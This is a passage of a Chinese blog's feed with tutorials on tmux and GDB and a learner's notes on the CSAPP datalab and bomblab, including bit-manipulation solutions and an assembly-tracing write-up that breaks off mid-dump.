    <content type="html"><![CDATA[<h1 id="tmux-tutorial"><a href="#tmux-tutorial" class="headerlink" title="tmux-tutorial"></a>tmux-tutorial</h1><h2 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h2><h3 id="启动会话"><a href="#启动会话" class="headerlink" title="启动会话"></a>启动会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux new -s &lt;name&gt; // 启动并命名会话</span><br></pre></td></tr></table></figure><h3 id="查看所有会话"><a href="#查看所有会话" class="headerlink" title="查看所有会话"></a>查看所有会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux ls</span><br></pre></td></tr></table></figure><h3 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a>分离会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux detach</span><br></pre></td></tr></table></figure><h3 id="恢复会话"><a href="#恢复会话" class="headerlink" title="恢复会话"></a>恢复会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tmux at [-t name]</span><br><span class="line"># at 是 attach 的缩写</span><br><span class="line">tmux attach [-t name]</span><br><span class="line"></span><br><span class="line">#e.g.</span><br><span class="line">tmux at -t debug</span><br></pre></td></tr></table></figure><h3 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a>重命名会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux rename-session -t 0 &lt;new-name&gt;</span><br></pre></td></tr></table></figure><h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tmux kill-session -t &lt;name&gt;</span><br><span class="line"># 关闭所有会话</span><br><span class="line">$ tmux kill-server</span><br></pre></td></tr></table></figure><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>所有快捷键之前要按<code>Ctrl + b</code></p><ul><li><p><code>c</code> 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态</p></li><li><p><code>p</code> 切换至上一窗口</p></li><li><p><code>n</code> 切换至下一窗口</p></li><li><p><code>,</code> 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id</p></li><li><p><code>0</code> 切换至 0 号窗口，使用其他数字 id 切换至对应窗口</p></li><li><p><code>f</code> 根据窗口名搜索选择窗口，可模糊匹配</p></li></ul><h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><ul><li><code>?</code> 列出所有快捷键；按q返回</li><li><code>:</code> 进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tmux-tutorial&quot;&gt;&lt;a href=&quot;#tmux-tutorial&quot; class=&quot;headerlink&quot; title=&quot;tmux-tutorial&quot;&gt;&lt;/a&gt;tmux-tutorial&lt;/h1&gt;&lt;h2 id=&quot;会话操作&quot;&gt;&lt;a href=&quot;#会话操作&quot;</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>GDB-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/19/GDB/"/>
    <id>https://1xueyu1.github.io/2024/02/19/GDB/</id>
    <published>2024-02-19T09:10:41.000Z</published>
    <updated>2024-02-19T09:23:58.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GDB-tutorial"><a href="#GDB-tutorial" class="headerlink" title="GDB-tutorial"></a>GDB-tutorial</h1><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.s # 可以得到bomb对应的汇编</span><br></pre></td></tr></table></figure><p>Linux strings命令</p><p>strings - print the strings of printable characters in files.</p><p>意思是， 打印文件中可打印的字符。 我来补充一下吧， 这个文件可以是文本文件（test.c）, 可执行文件(test), 动态链接库(test.o), 静态链接库(test.a)</p><h2 id="GDB-使用"><a href="#GDB-使用" class="headerlink" title="GDB 使用"></a>GDB 使用</h2><ul><li><p><code>run/r</code> : 运行程序</p></li><li><p><code>break/b &lt;function_name&gt;/&lt;address&gt;</code> : 在函数名称或地址下断点</p></li><li><p><code>continue/c</code> : 继续运行程序</p></li><li><p><code>info registers/r</code> : 显示所有寄存器的信息</p></li><li><p><code>print/p $rax</code> : 打印某个寄存器的值 (in decimal)</p></li><li><p><code>p/x $rax </code>: 打印某个寄存器的值 (in hex)</p></li><li><p><code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt; </code> 和<code>display</code>用法一样。 将<code>x</code>替换为<code>display</code>即可</p><ul><li><p><code>&lt;u&gt;</code> 是要显示的单位大小 <code>eg: b(1byte), h(2byte), w(4byte), g(8byte)</code></p></li><li><p><code>&lt;f&gt;</code> 是要显示它的格式 <code>eg: d(decimal), x(hexadecimal), s(string), i(instruction)</code></p><p>The address can be specified using a register name, symbol name, or<br>absolute address. Additionally, you can supply mathematical expressions when specifying the address.</p></li><li><p><code>&lt;n&gt;</code>是要显示的元素个数</p></li><li><p><code>eg:</code></p><ul><li><code>x/8i $rip</code> will print the next 8 instructions from the current instruction pointer</li><li><code>x/16i main</code> will print the first 16 instructions of main</li><li><code>x/16gx $rsp</code> will print the first 16 values on the stack</li><li><code>x/gx $rbp-0x32</code>will print the local variable stored there on the stack</li></ul></li></ul></li><li><p><code>disassemble/disas &lt;function_name&gt;</code> : 将函数的汇编代码显示出来</p></li><li><p><code>set disassembly-flavor intel</code>: You will probably want to view your instructions using the CORRECT assembly syntax.</p></li><li><p><code>set</code> : 给寄存器赋值 <code>eg: set $rax = 0</code></p></li><li><p><code>stepi/si &lt;n&gt;</code>： 执行 n 条指令，会进入函数</p></li><li><p><code>nexti/ni &lt;n&gt;</code>： 执行 n 条指令，不会进入函数</p></li><li><p><code>finish</code> : 执行到当前函数结尾</p></li><li><p><code>layout regs</code>: 将界面变为如下格式</p></li><li><p><img src="/2024/02/19/GDB/image-20240122170103582.png" alt="image-20240122170103582"></p></li></ul><h3 id="GDB-script"><a href="#GDB-script" class="headerlink" title="GDB script"></a>GDB script</h3><p>You can write your commands to some file, for example <code>x.gdb</code>, and then launch gdb using the flag <code>-x &lt;PATH_TO_SCRIPT&gt;</code>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GDB-tutorial&quot;&gt;&lt;a href=&quot;#GDB-tutorial&quot; class=&quot;headerlink&quot; title=&quot;GDB-tutorial&quot;&gt;&lt;/a&gt;GDB-tutorial&lt;/h1&gt;&lt;h2 id=&quot;反编译&quot;&gt;&lt;a href=&quot;#反编译&quot; class</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab</title>
    <link href="https://1xueyu1.github.io/2024/02/17/CSAPP/"/>
    <id>https://1xueyu1.github.io/2024/02/17/CSAPP/</id>
    <published>2024-02-17T14:17:36.000Z</published>
    <updated>2024-02-27T12:51:59.574Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/505497911">CSAPP一键环境配置、完成8个lab总结 - 知乎 (zhihu.com)</a></p><p>[toc]</p><h1 id="datalab"><a href="#datalab" class="headerlink" title="datalab"></a>datalab</h1><p>由介绍可知</p><p><code>bits.c</code>是我们写代码的文件</p><p><code>dlc</code>检查代码是否符合要求的，没问题的话就不返回消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; ./dlc bits,c</span><br><span class="line">unix&gt; ./dlc -e bits.c  // 计算每个函数用了多少个操作符</span><br></pre></td></tr></table></figure><p><code>btest</code>对合法代码测试是否正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; make btest </span><br><span class="line">unix&gt; ./btest [optional cmd line args]</span><br><span class="line">// 上面两行编译并执行程序, 每次修改bits.c文件后都要重新编译</span><br><span class="line"></span><br><span class="line">unix&gt; ./btest -h</span><br><span class="line">Usage: ./btest [-hg] [-r &lt;n&gt;] [-f &lt;name&gt; [-1|-2|-3 &lt;val&gt;]*] [-T &lt;time limit&gt;]</span><br><span class="line">    -1 &lt;val&gt;  Specify first function argument</span><br><span class="line">    -2 &lt;val&gt;  Specify second function argument</span><br><span class="line">    -3 &lt;val&gt;  Specify third function argument</span><br><span class="line">    -f &lt;name&gt; Test only the named function</span><br><span class="line">    -g        Format output for autograding with no error messages</span><br><span class="line">    -h        Print this message</span><br><span class="line">    -r &lt;n&gt;    Give uniform weight of n for all problems</span><br><span class="line">    -T &lt;lim&gt;  Set timeout limit to lim</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://zhuanlan.zhihu.com/p/650545012">【CSAPP笔记】2.4 浮点运算 - 知乎 (zhihu.com)</a></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="1-浮点数表示"><a href="#1-浮点数表示" class="headerlink" title="1.浮点数表示"></a>1.浮点数表示</h4><p>浮点数能够表示的数据类型为$x*2^y$ ，其中x和y均为整数。</p><p>对于那些不能够表示为$x*2^y$格式的数据，浮点数只能够近似表示。</p><p>IEEE <strong>规定</strong>了单精度浮点数格式(32位)和双精度浮点数格式(64位)。它们共同的特点为，按照低位到高位分别划分了三个域：frac(小数字段)，exp(指数字段)，s(符号位)。</p><p>单精度：frac 23位，exp 8位，s 1位。共计32位。</p><p>双精度：frac 52位，exp11位，s 1位。共计64位。</p><p>以单精度为例，将所有的浮点数<strong>规定</strong>为3个种类</p><p><img src="/2024/02/17/CSAPP/v2-97027a419936c42504d0bb371e399c4a_r.jpg" alt="img"></p><p>1、Normalized(规格化)；</p><p>2、Denormalized(非规格化)；</p><p>3、Special Value(特殊值)，具体分为Infinity(无穷)和NAN(不是一个数)。</p><ul><li><strong>第三类情况，Special Value</strong></li></ul><p><strong>当exp 为 全1时，表示的是special value</strong>。</p><p>1、若frac为全0，表示无穷。</p><p>2、当frac不为全0时，表示NAN(不是一个数)。</p><ul><li><strong>第一类情况 Normalized</strong></li></ul><p><strong>当exp 为 既非全0 也非全1时，表示的是Normalized</strong> 。</p><ul><li><strong>第二类情况</strong></li></ul><p><strong>当exp 为全0时，表示的是Denormalized</strong> 。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>用<code>&amp;</code>, <code>~</code> 实现异或操作<code>^</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int bitXor(int x, int y) &#123;</span><br><span class="line">return ~(~(x &amp; ~y) &amp; ~(~x &amp; y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>返回补码中的最小值<code>-128 0x10000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int tmin(void) &#123;</span><br><span class="line">return 0x1 &lt;&lt; 31;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>如果<code>x</code>是二进制最大值<code>0x7fffffff</code>返回1，否则返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) &#123;</span><br><span class="line">   int t = (x + 1); </span><br><span class="line">   x ^= t;</span><br><span class="line">   x = ~x; // 三行代码使得`0x7fffffff`变为`0x0`</span><br><span class="line">   // 接下来排除 x 为 -1 的情况</span><br><span class="line">   t = !t; // 如果 x = -1, 可知 t = 0, 否则 t = 0x100000...</span><br><span class="line">   x = x + t; // 即可排除-1的干扰</span><br><span class="line">   return !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>如果 x 的奇数位上都是1则返回1，否则返回0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0xaa</span>;</span><br><span class="line">    t = t + (t &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    t = t + (t &lt;&lt; <span class="number">16</span>); <span class="comment">// 得到 0xaaaaaaaa</span></span><br><span class="line">    <span class="keyword">return</span> !((t &amp; x) ^ t); <span class="comment">// t &amp; x 清除无关数位再与t异或得到0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>返回x的相反数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>通过位级运算计算 <code>x</code> 是否在 0x30 - 0x39 范围内就是这个题的解决方案。那如何用位级运算来操作呢？我们可以使用两个数，一个数是加上比0x39大的数后符号由正变负，另一个数是加上比0x30小的值时是负数。这两个数是代码中初始化的 <code>upperBound</code> 和 <code>lowerBound</code>，然后加法之后获取其符号位判断即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> upperBound = ~(sign|<span class="number">0x39</span>);</span><br><span class="line">  <span class="type">int</span> lowerBound = ~<span class="number">0x2f</span>;</span><br><span class="line">  upperBound = sign&amp;(upperBound+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  lowerBound = sign&amp;(lowerBound+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !(upperBound|lowerBound);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>使用位级运算实现C语言中的 <code>x?y:z</code>三目运算符。又是位级运算的一个使用技巧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int conditional(int x, int y, int z) &#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x+1;</span><br><span class="line">  return (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们根据 <code>x</code> 的布尔值转换为全0或全1是不是更容易解决了，即 <code>x==0</code> 时位表示是全0的， <code>x!=0</code> 时位表示是全1的。这就是1-2行代码，通过获取其布尔值0或1，然后求其补码（0的补码是本身，位表示全0；1的补码是-1，位表示全1）得到想要的结果。然后通过位运算获取最终值。</p><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>用位运算实现<code>&lt;=</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="type">int</span> negX=~x+<span class="number">1</span>;<span class="comment">//-x</span></span><br><span class="line">  <span class="type">int</span> addX=negX+y;<span class="comment">//y-x</span></span><br><span class="line">  <span class="type">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>; <span class="comment">//y-x的符号</span></span><br><span class="line">  <span class="type">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;<span class="comment">//最大位为1的32位有符号数</span></span><br><span class="line">  <span class="type">int</span> xLeft = x&amp;leftBit;<span class="comment">//x的符号</span></span><br><span class="line">  <span class="type">int</span> yLeft = y&amp;leftBit;<span class="comment">//y的符号</span></span><br><span class="line">  <span class="type">int</span> bitXor = xLeft ^ yLeft;<span class="comment">//x和y符号相同标志位，相同为0不同为1</span></span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//符号相同标志位格式化为0或1</span></span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));<span class="comment">//返回1有两种情况：符号相同标志位为0（相同）位与 y-x 的符号为0（y-x&gt;=0）结果为1；符号相同标志位为1（不同）位与x的符号位为1（x&lt;0）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x, y 符号相同时可以通过x-y的符号位判断两数大小</p><p>x, y 符号不同时可以通过判断x的符号位是否为1</p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>实现逻辑非 <code>!</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(x | (~x + 1))除x &#x3D;&#x3D; 0外都是0xffffffff，当x &#x3D;&#x3D; 0时为0x0</p><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>计算一个数最少需要多少位表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="type">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);<span class="comment">//如果x为正则不变，否则按位取反 （解释见下面思路）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不断缩小范围</span></span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;<span class="comment">//高十六位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><p>对于一个正数 <code>0x0110101</code>, 因为从符号位到第一个 1 时都是 0 ， 所以从第一个 1 到最后一位能记录下来这个正数。</p><p>对于一个负数<code>0x11101</code>, 为了避免符号位的影响，所以记录 0 的最高位，发现取反后是找到 1 的最高位，所以和正数的逻辑一样且代码可复用。</p><p>因此<code>x = (sign&amp;~x)|(~sign&amp;x)</code>当 x 为正数就不变，为负数就取反。 </p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>求2乘一个浮点数</p><h1 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h1><p>汇编语言的学习就不说了，网上教程很多。</p><h2 id="GDB使用"><a href="#GDB使用" class="headerlink" title="GDB使用"></a>GDB使用</h2><p>见我的文章GDB使用</p><p><code>disas func_name</code>查看某函数的汇编代码</p><p>等等</p><h2 id="tmux使用"><a href="#tmux使用" class="headerlink" title="tmux使用"></a>tmux使用</h2><p>同理见我文章tmux-tutorial</p><p>因为在debug时想代码对照着看，所以将屏幕分成两边，一遍显示代码，另一边debug。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>movzbl指令负责拷贝一个字节，并用0填充其目的操作数中的其余各位，这种扩展方式叫“零扩展”。</p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="pahse-1"><a href="#pahse-1" class="headerlink" title="pahse_1"></a>pahse_1</h3><p>先<code>disas phase_1</code>得到汇编代码再进行分析</p><p>忘了贴上来，但是比较简单就算了</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>首先<code>disas phase_2</code>查看汇编代码，发现有一个<code>read_six_numbers</code>，说明第二关是输入6个数字</p><p><strong>第一个数</strong>跟踪很容易发现先比较第一个数如果不为<code>1</code>，就炸了</p><p><img src="/2024/02/17/CSAPP/image-20240219210320335.png" alt="image-20240219210320335"></p><p><strong>第二个数</strong></p><p><img src="/2024/02/17/CSAPP/image-20240219211459258.png" alt="image-20240219211459258"></p><p>根据代码运行顺序可知第二个数是第一个数的两倍</p><p><strong>第三个数</strong></p><p>因为陷入了一个循环，退出的地方是<code>cmp %rbp, %rbx</code>而<code>%rbp</code>指向的是第六个数的后一个数，并且每个循环<code>%rbx</code>都向后指一个，说明剩下的数需要时前一个数的两倍。</p><p>得到答案**<code>1 2 4 8 16 32 </code>**</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>先看函数的汇编代码</p><p><img src="/2024/02/17/CSAPP/image-20240219213444832.png" alt="image-20240219213444832"></p><p>可以发现代码中由一个奇怪的数字<code>0x4025cf</code></p><p><img src="/2024/02/17/CSAPP/image-20240219213837399.png" alt="image-20240219213837399"></p><p>查看发现时这样一个字符串，结合下面的<code>sscanf</code>,猜测可能时读取两个数字</p><p><img src="/2024/02/17/CSAPP/image-20240219213936277.png" alt="image-20240219213936277"></p><p>调用<code>sscanf</code>函数返回值存放在<code>%rax</code>中说明读取数据需要大于一个数</p><p><img src="/2024/02/17/CSAPP/image-20240219214049388.png" alt="image-20240219214049388"></p><p>根据这段代码发现<code>0x8(%rsp)</code>是我们输入的第一个数，得知第一个数不能大于7。</p><p><img src="/2024/02/17/CSAPP/image-20240219214701207.png" alt="image-20240219214701207"></p><p>由代码可知<code>0x8(%rsp)</code>指向第一个数，跟随代码运行可以发现</p><p>再<code>0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)</code>这一行发现执行的代码与第一个数有关，根据第一个数的值选择对应的代码执行，并给eax赋值，最后<code>&lt;+123&gt;:   cmp    0xc(%rsp),%eax</code>这一句代码是第二个数与eax比较，相等即可通过</p><p><img src="/2024/02/17/CSAPP/image-20240219221254988.png" alt="image-20240219221254988"></p><p>通过跟踪可以得出一个答案<code>5, 206</code></p><p>第一个数应该是 1 - 7 都行，跟对得到第二个数就行</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p><img src="/2024/02/17/CSAPP/image-20240219221849413.png" alt="image-20240219221849413"></p><p>易知第一个数要小于等于<code>0xe</code>即14。再查看<code>func4</code>，执行完<code>func4</code>后eax需要为0，然后记录函数的参数进入<code>func4</code></p><p><img src="/2024/02/17/CSAPP/image-20240219222557539.png" alt="image-20240219222557539"></p><p>因为要使eax变为0， 我们需要执行</p><p><code>000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</code>这句代码使从这里跳转来的，通过跟踪可知 ecx &#x3D; 7, edi &#x3D; 我们输入的第一个数， 所以第一个数 &lt;&#x3D; 7, eax已经赋值为0了所以直接跳出函数即可。令edi &gt;&#x3D; 7即可。即第一个数 &#x3D; 7。</p><p><img src="/2024/02/17/CSAPP/image-20240219225316049.png" alt="image-20240219225316049"></p><p>回到<code>phase_4</code>后跟踪易得令第二个数为0即可。</p><p>所以答案为<code>7 0</code></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line"># 读取一个字符串，长度为 6。</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line"># 将 rax 清 0 并跳转到 &lt;+41&gt; 处</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a 